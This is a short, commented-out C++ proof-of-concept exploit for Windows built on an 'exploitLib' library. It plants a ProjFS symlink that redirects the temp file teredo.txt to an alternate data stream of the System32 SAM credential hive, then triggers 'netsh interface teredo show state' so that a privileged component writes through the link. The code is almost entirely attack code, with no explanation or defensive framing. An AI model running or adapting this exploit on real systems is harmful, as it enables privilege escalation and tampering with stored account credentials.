/*
#include <exploitLib/exploitLib.h>
#include <exploitLib/primitives.h>
#include "exploitLib/projfs.h"
using namespace x::literalNS;
 
int main(int argc, const char* args[])
try
{

 
   getchar();
   try { x::file{ "%WINDIR%\\temp\\teredo.txt"_p,FILE_GENERIC_WRITE,FILE_OPEN_REPARSE_POINT,FILE_OPEN }.deleteFile(); }   catch (...) {};

   x::file tmpFolder{ "%TEMP%"_p / x::guid::random_guid() , FILE_READ_ATTRIBUTES,FILE_DIRECTORY_FILE };
   virtualRoot vroot{ tmpFolder.getFinalPath() };
   vroot.makeSymlink("temp", "C:\\Windows\\System32\\config\\SAM:qqq", false);
   x::file{ tmpFolder / "temp"_p, DELETE,FILE_OPEN_REPARSE_POINT }.rename("%WINDIR%\\temp\\teredo.txt"_p);

   x::process::ShellExecuteW(L"netsh", L"interface teredo show state");

   return 0;
}
catch (wil::ResultException& e)
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
}
catch (std::exception& e)
{
   std::wcout << e.what() << std::endl;
}
*/